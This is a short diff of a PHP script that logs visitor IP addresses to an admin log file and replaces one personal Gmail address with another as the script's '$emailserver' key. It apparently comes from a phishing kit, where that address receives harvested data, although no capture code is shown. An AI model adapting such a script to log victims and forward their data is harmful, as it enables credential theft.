@@ -10,7 +10,7 @@
 $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
 file_put_contents('admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
 $url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-$emailserver ="cybreworm@gmail.com";
+$emailserver ="wagihm62@gmail.com";
 $key = $emailserver;
 ?>
 
